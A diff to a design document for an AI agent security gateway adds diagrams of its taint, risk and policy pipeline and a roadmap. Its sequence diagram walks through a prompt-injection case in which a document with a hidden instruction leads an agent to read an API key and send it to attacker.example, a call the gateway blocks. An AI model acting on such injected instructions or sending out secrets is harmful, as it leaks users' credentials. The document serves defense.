@@ -22,6 +22,21 @@ orchestration time** is not.
 
 ## Component design
 
+```mermaid
+flowchart TB
+    U["User prompt + untrusted document"] --> A["Agent Runtime<br/>holds only ToolProxy handles"]
+    A -->|"ToolCallRequest — no direct tool access"| GW
+    subgraph GW["SentinelAI Gateway — Reference Monitor"]
+        direction TB
+        T["1 - Taint Engine<br/>produces facts, never decides"] --> R["2 - Risk Engine<br/>score + band (advisory only)"]
+        R --> P["3 - Policy Engine<br/>facts + YAML -> ALLOW / BLOCK / APPROVE"]
+        P --> AU["4 - Audit Store<br/>append-only evidence chain"]
+    end
+    GW -->|ALLOW| TOOLS["Real Tools<br/>document_read - database_read - http_request"]
+    GW -->|BLOCK| STOP["Blocked — nothing executes,<br/>evidence recorded"]
+    TOOLS --> EXT["External world / egress"]
+```
+
 ### Separation of concerns (a deliberate, defensible choice)
 
 - **Taint engine produces facts, never decides.** It answers: has this session
@@ -30,7 +45,7 @@ orchestration time** is not.
 - **Policy engine decides, from facts alone.** Rules live in YAML (`trifecta.yaml`),
   match against facts, and combine with **deny-overrides** (any BLOCK wins). The
   decision is a pure, deterministic function of `(facts, policy)`.
-- **Risk engine scores for urgency only.** A documented weighted formula → 0–100 →
+- **Risk engine scores for urgency only.** A documented weighted formula -> 0–100 ->
   band. The ALLOW/BLOCK decision never depends on a fuzzy threshold.
 
 ### Complete mediation
@@ -51,11 +66,32 @@ mode before enforcing.
 
 ## End-to-end flow (flagship attack, ENFORCE)
 
-1. `document_read` (untrusted) → session flagged `has_untrusted_ingest`.
-2. `database_read` (sensitive) → `has_sensitive_access`; secret value recorded.
-3. `http_request` (external sink) with the secret in its body → taint facts show
+```mermaid
+sequenceDiagram
+    participant User
+    participant Agent
+    participant Gateway
+    participant Tools
+    User->>Agent: "Summarize this document"
+    Agent->>Gateway: document_read(quarterly_report.txt)
+    Gateway->>Tools: ALLOW — reading is fine
+    Tools-->>Gateway: doc text (hidden instruction)
+    Note over Gateway: session.has_untrusted_ingest = true
+    Agent->>Gateway: database_read(CUSTOMER_API_KEY)
+    Gateway->>Tools: ALLOW
+    Tools-->>Gateway: sk-live-abc123SECRET
+    Note over Gateway: session.has_sensitive_access = true
+    Agent->>Gateway: http_request(attacker.example, body=secret)
+    Note over Gateway: all 3 trifecta legs converge on an external sink
+    Gateway--xAgent: BLOCK (CRITICAL) — tool never runs
+    Note over Gateway: audit: matched policies + evidence chain
+```
+
+1. `document_read` (untrusted) -> session flagged `has_untrusted_ingest`.
+2. `database_read` (sensitive) -> `has_sensitive_access`; secret value recorded.
+3. `http_request` (external sink) with the secret in its body -> taint facts show
    untrusted ingest + sensitive access + external sink + sensitive value in args.
-4. Policy matches two BLOCK rules → deny-overrides → **BLOCK**. Tool never runs.
+4. Policy matches two BLOCK rules -> deny-overrides -> **BLOCK**. Tool never runs.
 5. Audit records the block with matched policies, severity, references, and an
    evidence chain (the prior event IDs) — the attack chain, for free.
 
@@ -70,8 +106,32 @@ mode before enforcing.
 They cover each other's weaknesses. The enforcement decision leans on the
 conservative rule so that evading the precise matcher does not defeat containment.
 
-## Scaling (future)
+## Roadmap / future implementation
 
-The pipeline is stateless per call except for per-session provenance, so it shards
-by session. Audit moves to an append-only, partitioned store; analysis can run
-async. None of this changes the security model.
+Built so far is the MVP (M1–M2): the reference-monitor gateway, provenance
+tracking, deterministic policy enforcement, and the verified OFF-vs-ON demo.
+Planned work extends the same architecture without changing the security model.
+
+```mermaid
+flowchart LR
+    subgraph DONE["Built — MVP"]
+        direction TB
+        M1["M1 - Gateway + flagship attack<br/>(DISABLED baseline)"]
+        M2["M2 - Taint + Policy + Risk<br/>ENFORCE blocks - 14 tests"]
+        M1 --> M2
+    end
+    subgraph NEXT["Planned"]
+        direction TB
+        M3["M3 - Persistent audit (Postgres)<br/>event query + dashboard"]
+        M4["M4 - Red-team runner<br/>attack catalog + scenarios"]
+        M5["M5 - ML supporting signal<br/>anomaly detection, honest eval"]
+        M6["M6 - RAG poisoning + DLP<br/>container hardening"]
+        M3 --> M4 --> M5 --> M6
+    end
+    M2 --> M3
+```
+
+Because the pipeline is stateless per call except for per-session provenance, it
+shards by session. Audit moves to an append-only, partitioned store; analysis can
+run async. None of this changes the security model — each addition is a new signal
+or sink feeding the same deterministic policy decision.
